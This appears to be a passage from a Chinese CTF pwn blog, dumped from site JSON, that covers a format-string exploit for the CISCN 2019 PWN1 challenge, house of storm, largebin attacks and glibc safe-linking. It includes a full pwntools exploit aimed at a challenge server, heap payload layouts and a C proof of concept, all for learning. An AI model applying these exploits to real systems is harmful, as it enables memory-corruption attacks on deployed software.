还加上了9字节的\\x00 也就是会自动补全我们输出的字符 而其占用的字节数也很小 哪怕是%0x10000c 所占用的字节数也只为9 这就使得哪怕题目限制了我们利用格式化字符漏洞的payload的字节数 我们仍然可以保证任意写的攻击 但是这仍然不够完美 我们还有没有更好的办法来修改got表这样的地址其值 我们来看一下函数的got表 在32位情况下 其存储的值是如何占用这四个字节 可以看到是小端序存储 并且一个字节对应着两个数字 那么比如说printf函数中的got表 高位的0x08 对应的地址为0x804989c + 3 如果我们只需要修改高位的值 就可以往这个地址写入单字节 利用 ‘h’来构造格式化字符 payload = &quot;%&quot;+str(要修改的值).encode()+&quot;c%偏移$hhn&quot;payload += p64(地址) 实例分析下面利用一道国赛题来帮助理解 [CISCN 2019西南]PWN1 查看一下保护机制 没有开启Partical RELRO 或者是Full RELRO 那么可以fini_array处就有可写的权限 ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char format[68]; // [esp+0h] [ebp-48h] BYREF setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); puts(&quot;Welcome to my ctf! What&#x27;s your name?&quot;); __isoc99_scanf(&quot;%64s&quot;, format); printf(&quot;Hello &quot;); printf(format); return 0;&#125; 同时还提供了system函数 只有一次格式化字符串的机会 既然可以修改fini_array 那么我们首先想到的就是利用格式化字符串漏洞 将fini_array修改为main函数的地址 不过实际攻击效果和我预期的有点不一样 在第二次执行完main函数以后就没有办法再次返回了 估计是栈空间不够的锅 那没办法 就只能在第一次格式化字符串的时候就同时修改fini_array和printf函数的got表 就是这里 利用fmstr_payload构造出来的payload无法达到预期的攻击效果 所以我们采用手写的方式 首先是计算一下偏移 这个就不详细展开了 最后发现的偏移是4 fini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr) 首先我们要清楚一点 如果单次格式化字符利用想要修改多个地址值 那么后面需要修改的值一定是要大于前面的 因为前面%c输出的空字符 也算到后面的总字节数里面的 为了防止修改的值超出预期 所以需要把较大的数值安排到后面 还有一点是为什么要用str().encode()的形式 是因为python3 byte型和字符型的要求 完整exp: from pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28573)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()fini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr)print(len(payload))io.sendline(payload)io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"house of storm","slug":"house-of-storm","date":"2023-03-13T05:10:20.000Z","updated":"2023-09-14T17:19:44.000Z","comments":true,"path":"2023/03/13/house-of-storm/","link":"","permalink":"http://example.com/2023/03/13/house-of-storm/","excerpt":"","text":"前言一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果 在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查 largebin attack受限于其只能单一的在任意地址写堆地址 但是如果将二者结合起来 就可以达到任意地址申请chunk的效果 不过这个办法也是旧时代的眼泪了 在libc2.30以后就诞生了新的检查机制来防止 源码分析首先我们要清楚整个漏洞的触发流程 先是利用unsortedbin chunk放入到largebin chunk中 从而将fake chunk链入unsorted_chunks (av) /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; // 把 fake_chunk 链入 unsorted_chunks(av) bck-&gt;fd = unsorted_chunks (av); // 把 fake_chunk 的 fd 改成 unsorted_chunks (av) 同时还可以将fake chunk的fd域修改为unsorted_chunks (av) 为了达到这一目的 我们就需要更改unsortedbin chunk的bk域为fakechunk_addr - 0x10 这里之所以还要减去0x10 是为了腾出size域和prev_size域的空间 紧接着我们需要利用largebin attack来写fake chunk的size域 以及完善fake chunk的结构 以供绕过双向链表的检测 else &#123; victim-&gt;fd_nextsize = fwd; //unsortedbin的fd_nextsize域被设置为了largebin chunk的首地址 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; //unsortebin的bk_nextsize域被设置为largebin的bk_nextsize fwd-&gt;bk_nextsize = victim; //把largebin的bk_nextsize域设置为unsortedbin的首地址 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;//这里就是伪造size的关键句 将unsortedbin的bk_nextsize指向的地址+0x20处填入unsortedbin地址 &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; //把 unsorted bin 里刚放进的 chunk-&gt;bk 改为 large bin-&gt;bk victim-&gt;fd = fwd; //把 unsorted bin 里刚放进的 chunk-&gt;fd 改为 large bin fwd-&gt;bk = victim; //把 large bin 的 chunk-&gt;bk 改为 unsorted bin 里刚放进的 chunk 的首地址 bck-&gt;fd = victim; //这里伪造了fake chunk的bk域 //bck = fwd-&gt;bk//bck-&gt;fd = (fwd-&gt;bk)+0x10 实际利用为了配合上述的源代码 我们需要将两个chunk的布局构造成下面这样 ptr_addr = 你想要任意写的地址-0x10payload = p64(0)+p64(ptr_addr) #unsortedbinpayload = p64(0)+p64(ptr_addr+0x8)+p64(0)+p64(ptr_addr-0x18-5) #largebin 具体的数值计算就自己根据源码来看了 应该挺好懂的 还有一点需要注意的就是unsoretbin chunk和largebin chunk的释放时机 add(0x418,b&#x27;aaaa&#x27;)#0add(0x18,b&#x27;aaaa&#x27;)#1add(0x408,b&#x27;aaaa&#x27;)#2 largebinadd(0x18,b&#x27;aaaa&#x27;)#3delete(2)delete(0)add(0x418,b&#x27;aaaa&#x27;)#4 unsortedbindelete(4)ptr_addr = 0xABCD0500-0x10payload = p64(0)+p64(ptr_addr)edit(4,len(payload),payload)payload = p64(0)+p64(ptr_addr+0x8)+p64(0)+p64(ptr_addr-0x18-5)edit(2,len(payload),payload)add(0x48,b&#x27;aaaa&#x27;)debug() 你可以看到 要先释放largebin chunk 这是因为要将size小的放在链表头 不然后续无法将其放入largebin 总体利用还是比较简单的 难在理解 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"LargebinAttack","slug":"LargebinAttack","date":"2023-03-04T14:08:12.000Z","updated":"2023-09-14T17:19:52.000Z","comments":true,"path":"2023/03/04/LargebinAttack/","link":"","permalink":"http://example.com/2023/03/04/LargebinAttack/","excerpt":"","text":"Largebin介绍Largebin用来收容超过0x400大小以上的chunk(64位) 其是一个双向链表一共可以容纳63个chunk 和fastbin等不同的是 其对于链表对应存储chunk的大小没有明确规定 而是一个范围一共分为6组这里的差值(以字节为单位)是一个什么意思呢 比如在组别1中 现在释放三个chunk到largebin中 chunkA的大小是0x400 chunkB的大小是0x410 chunkC的大小是0x450此时由于chunkC和chunkA的差值大于了64字节 所以chunkA和chunkB是位于同一组中 chunkC是另外一组这在largebin这个双向链表中是一个什么情形呢 我们知道 largebin相对于unsortedbin多出来两个域 一个fd_nextsize 一个bk_nextsize这两个域和fd和bk的域差距在哪里呢?在largebin中 不同组的排列是根据从大到小来的 方便其遍历fd_nextsize指向的是比当前组别小的组中最大的组bk_nextsize指向的是比当前组别大的组中最小的组而fd和bk则是用来指向组内的chunk这么说可能不太好理解 用一张图来演示一下size最大的chunk的bk_nextsize指向最小的chunksize最小的chunk的fd_nextsize指向最大的chunk并且相同大小的chunk只有链表头的fd_nextsize和bk_nextsize才有值 其余为0 Largebin中chunk的插入取出机制插入源码理解来看看glibc源码是如何逐步使得chunk插入到largebin链表中 /* place chunk in bin */ if (in_smallbin_range (size)) //如果是smallbin的大小就放到smallbin &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else //如果是largebin的大小，那么： &#123; victim_index = largebin_index (size);//根据size获取对应的largebin索引 bck = bin_at (av, victim_index); //获取largebin表头 fwd = bck-&gt;fd; //获取对应索引largebin的第一个chunk（循环链表的head-&gt;next） /* maintain large bins in sorted order */ if (fwd != bck) //当第一个不等于最后一个（即当前的largebin不空） &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); //是否在main_arena?（主线程） if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))//bck-&gt;bk储存的是当前索引的largebin中大小最小的chunk，如果我们要插入的chunk比这个大小还小，那么就要插入largebin的尾部。 &#123; fwd = bck; //fwd此时为largebin表头 bck = bck-&gt;bk; //bck设置为largebin中最后一个的chunk victim-&gt;fd_nextsize = fwd-&gt;fd;//由于我们要插入的在末尾，比他小的就是循环回去的第一个chunk victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;//比他大的就是之前的最小的那个 //原来链表的第一个chunk的bk指向此时新插入的最后一个chunk fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; // 如果不是插入尾部，那么我们要找到这个chunk应该插入的位置 else &#123; assert (chunk_main_arena (fwd)); //使用这个while循环尝试从链表头部开始遍历，直到找到一个比victim大或等于的chunk退出while while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; //取下一个 assert (chunk_main_arena (fwd));//检查分配区 &#125; //如果找到了跟他想等的 if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd;//直接将victim插入他的后面（通过fd），不修改nextsize指针。 //如果大小不一样(即此时fwd是相邻的大于victim的chunk) //需要构造nextsize双向链表，构造新节点,victim作为堆头 else &#123; //比victim小的指向fwd //比victim大的指向fwd的bk_nextsize（比fwd大的那个） //相当于插入了fwd与fwd-&gt;bk_nextsize之间 victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))//检查size链完整性 malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;); //对应的去改fwd的相关指针成链 fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //插入完成 &#125; bck = fwd-&gt;bk; if (bck-&gt;fd != fwd) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;); &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;//此时victim为唯一的chunk，也要做循环链表 &#125; //放到对应的 bin 中，构成 bk&lt;--&gt;victim&lt;--&gt;fwd。 mark_bin (av, victim_index); //标识bitmap victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; 上述的源码注释来源自 [原创]Largebin attack总结-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) 以下是我自己对于这个过程的理解 1.释放一个chunk后 首先对其大小进行判断 区分到smallbin或者是largebin 这里不讨论smallbin的情况 2.根据当前chunk的size 来索引对应的index 并且获得两个位于链表中chunk的指针 fwd指向链表头 也就是最大的chunk bck指向最小的chunk 3.对于fwd和bck进行判断 如果二者相等 那么此时链表中就为空 直接将chunk放置为链表头 如果二者不相同 那么链表不为空 分为两种情况 如果chunk的size不是当前链表中最小的 从链表头开始 根据fd_nextsize指针来从大到小依次对比链表中原有的chunk大小和要插入的chunk大小 如果没有找到 那么就在对应合适的位置将当前chunk置为对应的链表头 其fd_nextsize和bk_nextsize各自指向对应的链表 如果找到了 就接入对应链表中 fd_nextsize和bk_nextsize为0 4.如果当前chunk的size是当前链表中最小的 那么就直接放置到链表末尾 如果作为链表头 fd_nextsize指向最大的chunk的链表头 构成一个循环 bk_nextsize指向比当前链表更大一点的链表 如果链表尾的大小与要插入的chunk大小一致 那么就接在对应链表中 调试接下来我们来调试一番 调试环境 add(0x410,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)debug() chunk1用来防止chunk0释放以后和top chunk合并 此时chunk0释放以后优先进入unsortedbin 要使得重新分配unsortedbin中的chunk 就需要我们申请一个超过unsortedbin中所有chunk大小的堆块 这样就会把unsortedbin中所有的chunk分配到largebin或者smallbin中 否则则将大小足够分配申请的chunk的free chunk分配出所需要的大小 其余unsortedbin中的chunk各自检验大小放入到largebin中 add(0x450,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x490,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x500,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(2)delete(4)add(0x460,b&#x27;aaaa&#x27;)debug() 接着我们来看看双链表结构大概是一个什么样子 add(0x450,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x490,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x500,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(2)delete(4)add(0x550,b&#x27;aaaa&#x27;)debug() 申请三个大小足够放入到largebin的chunk 并且为了防止物理相邻合并用0x10大小的chunk隔开 最后申请一个大chunk将unsortedbin的chunk分配到largebin中 此时预期这三个chunk应该各自成为链表头 此时我们在原来的基础上再多申请一个0x450大小的chunk 不出意外应该是分配到0x440链表后 可以看到只有位于链表头的chunk的fd_nextsize和bk_nextsize才有值 具体的利用手法等下来讲吧 更进一步的调试可以自己尝试 取出源码理解/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range (nb))//如果不在samllbin大小中 &#123; bin = bin_at (av, idx); //找到申请的size对应的largebin链表 /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; //此时victim为链表的第一个节点 (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size &#123; //进入这里时，已经确定链表第一个节点——即最大的chunk大于要申请的size，那么我们就应该从这一条链中取，问题就是取这一条链上的哪一个？ victim = victim-&gt;bk_nextsize; //本来victim是链中最大的那个，现在我们要从小往遍历，那么victim-&gt;bk_nextsize就循环回了链中最小的那个 while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) //第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环 victim = victim-&gt;bk_nextsize;//victim取相邻的更大size的chunk /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。 victim = victim-&gt;fd; //出现相同大小时堆头作为次优先申请 remainder_size = size - nb; unlink (av, victim, bck, fwd); //第四步，largebin unlink 操作 /* Exhaust */ if (remainder_size &lt; MINSIZE) //第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; &#125; /* Split */ else &#123; remainder = chunk_at_offset (victim, nb); //第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中（切割后）。 /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av);//bck是ub头 fwd = bck-&gt;fd; //fwd是ub第一个chunk if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = &quot;malloc(): corrupted unsorted chunks&quot;; goto errout; &#125; remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; //以上操作完成后lastremainder被插入ub，成为新的链首元素 //如果不在smallbin范围，那么nextsize指针置空 if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); &#125; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 可以总结为以下流程: 1.首先读取largebin中最大chunk的大小 与用户申请的大小对比 如果小于则另寻办法申请chunk 如果大于就进入下一步 2.根据bk_nextsize来索引最小的chunk 顺着fd_nextsize来寻找与申请大小最为接近的chunk 3.如果查找到了合适的free chunk 先判断其是否只有单一chunk位于链表头 如果链表中有其他chunk的话 则分配其他chunk 这样是为了节省重新分配fd_nextsize和bk_nextsize的麻烦 4.判断分配完了的free chunk 如果剩余的大小大于MINSIZE 那么就放入到unsortedbin中 如果剩余大小小于MINSIZE 则一并分配给用户 调试首先是我自己的第一个疑问 如何申请到单位不是MINSIZE的chunk 先来尝试一下手动修改size值 看看会不会按照预期效果分配chunk 将这一个chunk的size域从0x461修改为0x466 按照源代码的逻辑 此时申请一个0x410大小的chunk 剩下被分配到unsortedbin的chunk大小应该为0x40 失败了 看来是无法单单通过修改size域来实现预期效果 到这里转念一想 64位构成一个chunk最起码也要0x20字节 毕竟还需要size域和prev_size域 也就是说如果此时largebin中有一个0x460的free chunk 我们申请一个0x450的chunk 显然会剩下0x10字节 小于MINSIZE 那么按照逻辑 就应该一起给了用户申请的chunk 可以看到确实是这样 漏洞利用修改bk_nextsize来造成overlap漏洞的原理在于将chunk从largebin中取出的时候 其是从最小的chunk开始索引 以此找到适合的free chunk用来分配 if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //判断链表的第一个结点，即最大的chunk是否大于要申请的size &#123; victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; //漏洞点，伪造bk_nextsize if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); ... return p; 关键点在于victim &#x3D; victim-&gt;bk_nextsize这一句 如果我们修改了victim的bk_nextsize域 再构造一个fake chunk 就可以申请到fake chunk 通常这一做法被用来构造overlap chunk 接下来详细分析一下 环境: libc2.23 漏洞目的:实现overlap chunk 漏洞需求:拥有向largebin中释放堆块的能力 能够泄露出堆地址 拥有堆溢出 演示二进制程序:由笔者自己编写 基本所有漏洞都有 首先我们需要先泄露libc基址 在没有UAF的前提下 我们可以通过申请两个chunk 将其释放到fastbin中 此时后释放的chunk位于链表头 其fd指向先释放的chunk 由于malloc函数在申请chunk的后并不会对chunk的内容进行清空 所以我们可以再次申请同样大小的chunk 将链表头的chunk申请出来 随后打印出chunk的内容 也就是泄露基址 add(0x10,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(1)delete(0)add(0x10,b&#x27;1&#x27;)#2show(2)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x31success(hex(heap_addr))add(0x10,b&#x27;aaaa&#x27;)#3 把还在fastbin中的chunk1申请回来 理论上应该不影响 但是在之前chunk extend的时候有影响 所以还是申请出来为妙 我们一共需要两个chunk 下面我们分别称这些chunk为chunkA B chunkA是要放入到largebin中的 并且其要为largebin中最大的chunk 这样修改chunkA的bk_nextsize域才能索引到fake chunk chunkB则是用来构造fake chunk的 在学习unlink的时候 当时的unlink可以做到任意地址申请 因为最后chunk的ptr和fd、bk域有关 largebin的unlink则是用来申请一个正在使用的chunk 从而导致overlap 为此我们只需要绕过一个判断即可 if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0)) malloc_printerr (&quot;corrupted double-linked list&quot;); 我们需要使得 fake chunk的fd域或者是bk域指向的地址 以此地址为chunk首地址 其bk域和fd域相应的存放fake chunk的首地址 此时的chunkB的内部构造应该是这个样子 这里之所以在fake_nextsize域后还要再加上fakechunk的首地址 就是为了绕过unlink检查 这里的fakechunk首地址放到哪里都行 只需要修改fd或者bk域 就比如图中的情况来说 我们需要保证这个值+0x20以后的地址存放着fakechunk的首地址 也就是我们需要填入chunkB+0x28 由于unlink的判断只需要满足一个就行 所以图中的构造其实是多余的 还需要注意的是nextsize域需要设置为0 因为如果nextsize域有值 plmalloc就会去申请下一个堆块 而非链表头的堆 bss_addr = 0x602200add(0x10,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(1)delete(0)add(0x10,b&#x27;1&#x27;)#2show(2)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x31success(hex(heap_addr))add(0x10,b&#x27;aaaa&#x27;)#3add(0x470,b&#x27;aaaa&#x27;)#4add(0x20,b&#x27;aaaa&#x27;)#5delete(4)add(0x480,b&#x27;aaaa&#x27;)#6chunkB_addr = heap_addr +0x4f0success(&quot;chunkB_addr :&quot;+hex(chunkB_addr))payload = cyclic(0x18)+p64(0x481)+p64(0)*3+p64(chunkB_addr+0x10)edit(3,len(payload),payload)payload = cyclic(0x28)+p64(0x491)payload1 = p64(0)+p64(0x481)+p64(chunkB_addr+0x40-0x18)+p64(chunkB_addr+0x40-0x10)+p64(0)*2+p64(chunkB_addr+0x10)*2payload1 = payload1.ljust(0x480,b&#x27;\\x00&#x27;)payload = payload+payload1edit(5,len(payload),payload)# payload = p64(chunkB_addr+0x10)*2# bss_write(bss_addr,payload)add(0x470,b&#x27;aaaa&#x27;)#8debug() 代码中注释的部分是bss段上构造双向链表 不过感觉正常的题不会给这个机会 也就我自己编写的题会给一个bss_write函数了 修改bk域和bk_nextsize域实现任意地址写堆地址这种利用手法的意义在于 fastbin对于申请出来的chunk的大小和对应链表有检测 如果利用这个的话 就可以绕过这个检测 利用的关键在于源码中的这两处地方 victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; #1victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; fwd-&gt;bk = victim; #2 第一句 此时的victim指向的是要放入largebin的chunk 其bk_nextsize域的值由fwd的bk_nextsize域决定 而victim的bk_nextsize指向的地址的fd_nextsize域会存入victim的地址 所以如果我们修改fwd的bk_nextsize域 就可以做到堆地址写 第二句 fwd的bk域指向的地址会存入victim的地址 这里同样可以利用 所以我们只需要修改已经位于largebin中的一个chunk的bk域和bk_nextsize域 同时释放一个size大于其的chunk进入largebin 就可以利用漏洞 bss_addr = 0x602200add(0x400,b&#x27;aaaa&#x27;)#0add(0x10,b&#x27;aaaa&#x27;)#1delete(0)add(0x410,b&#x27;aaaa&#x27;)#2add(0x410,b&#x27;aaaa&#x27;)#3payload = p64(0)+p64(bss_addr)+p64(0)+p64(bss_addr)edit(0,len(payload),payload)delete(2)add(0x430,b&#x27;aaaa&#x27;)#4debug() 之所以chunk3的大小要同为可以被释放进largebin 是因为防止过小从chunk0中分配 导致chunk0被放入到unsortedbin 调大chunk0的值同样可行 chunk4的目的在于将chunk2放入到largebin 此时的bss_addr内容如图所示 以0x602200为首地址 两字长后为bk域 是fwd-&gt;bk &#x3D; victim的效果 也就是如果我们修改fwd的bk域 那么任意写的地址在于ptr_addr + 0x10 bk_nextsize的值则是victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim的效果 也就是我们修改fwd的bk_nextsize域 任意写的地址在于ptr_addr + 0x20 largebin的利用在高版本中还是比较常见的 许多house of系列就是基于largebin的 需要好好掌握 2.31以上漏洞利用2.31对于largebin的检查做了一些增强 虽然还是能够largebinattack 往任意地址写堆地址 但是攻击效果没有那么强大了 新版本针对largebin 新增了两个检查 导致我们原本的方法行不通了 if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);if (bck-&gt;fd != fwd) malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;); 但是还是有办法 原本我们利用的是比largebin中大的chunk放入largebin 引起的那些操作与之相对的 还有小chunk放入largebin中的操作 不过只能往一个地址写入堆地址 相比之攻击效果不够强大 所以一开始没有使用 if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125; 上面就是我们要利用的代码 直接跟着我来源码调试吧 这样就清楚了 我写的POC： #include&lt;stdio.h&gt;#include&lt;malloc.h&gt;int main()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(&quot;make by chen&quot;); char test_array[0x20]; size_t *p1 = malloc(0x460); //largebin malloc(0x10); //to separate size_t *p2 = malloc(0x450); //unsortedbin malloc(0x450); //to separate free(p1); malloc(0x470); //Release p1 into largebin free(p2); //Release p2 into unsortedbin *(p1+3) = test_array-0x20; malloc(0x470); //Release p2 into largebin&#125; 申请四个chunk chunk1和4用来防止合并 接着释放chunk0 随后申请一个大chunk 把chunk0放入到largebin中 并且把chunk2也放入到unsortedbin中 接着我们需要伪造chunk0的bk_nextsize 将其修改为ptr_addr-0x20 然后把chunk2释放到largebin中 s进入malloc函数 接着n到int_malloc函数 再次s进入 断点打在这三行源代码所在的行数 我所用的源码是3846 然后c到这里即可 此时的victim-&gt;fd_nextsize即chunk2的fd_nextsize域 fwd-&gt;fd指向chunk0 执行完这步后 chunk2的fd_nextsize域写入chunk0的地址 下一句相当于 chunk2的bk_nextsize域写入chunk0的bk_nextsize域内容 接下来一句就是我们任意写的关键了 往chunk0的bk_nextsize域 以及chunk2的bk_nextsize的fd_nextsize域写入chunk2地址 但是前一句 已经修改了chunk2的bk_nextsize域为chunk0的bk_nextsize域 所以此时是往我们修改的Ptr_addr+0x20写入chunk2地址 总结一下 就是修改largebinchunk的bk_nextsize为ptr_addr-0x20 就可以往ptr_addr写入unsortedchunk的地址 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"safe-linking","slug":"safe-linking","date":"2023-03-03T05:17:52.000Z","updated":"2023-09-14T17:20:36.000Z","comments":true,"path":"2023/03/03/safe-linking/","link":"","permalink":"http://example.com/2023/03/03/safe-linking/","excerpt":"","text":"前言低版本中 无论是tcachebin还是fastbin 只要我们修改fd域就可以将对应地址放置到链表上 威胁程度非常高 在libc2.32以后 saft-linking机制诞生 一定程度上缓解了这种现象的出现 其通过在chunk被释放到链表之前对fd域进行加密 取出后解密来实现堆块的存入和取出 并且有效遏制了用户在没有密匙的情况下篡改fd域从而实现任意地址申请的chunk 不过这个加密的手段比较简单 所以我们仍然有办法绕过这个机制 只需要获取其密匙就行了 源码解析/* Safe-Linking: Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. That is, mask the &quot;next&quot; pointers of the lists&#x27; chunks, and also perform allocation alignment checks on them. This mechanism reduces the risk of pointer hijacking, as was done with Safe-Unlinking in the double-linked lists of Small-Bins. It assumes a minimum page size of 4096 bytes (12 bits). Systems with larger pages provide less entropy, although the pointer mangling still works. */#define PROTECT_PTR(pos, ptr) \\ ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))#define REVEAL_PTR(ptr) PROTECT_PTR (&amp;ptr, ptr) pos是指针本身的地址 ptr是指针的值 加密的公式翻译成中文形式也就是 (fd指针地址算术右移12位)异或(指针的值) 如果我们想要按照以前一样任意地址取出chunk 就需要在修改fd域的时候就按照这个加密办法 这也就意味着我们需要获取到堆的地址 这样才能伪造fd域 利用你可能会想到申请两个chunk 释放进bin中 随后泄露其fd域 获取堆地址 这样当然可行 不过由于这个机制 我们泄露fd域的方法会更加简单 如果单纯释放一个chunk到tcache链表中 换做往常 其fd域值为0 但是受到机制的影响 在2.32版本以后 此时的fd域应该是 (0x55b170682260&gt;&gt;12) ^ 0 你会发现最后的结果也就是去除了后三位 这就意味着如果我们释放一个chunk到tcachebin中 再泄露出fd域 得到的值算术左移12位 就可以得到堆基址 因为堆基址是从当前页起始 也就是后三位固定为0 并且只申请一个chunk的话 大小总不会超过0x1000吧 于是 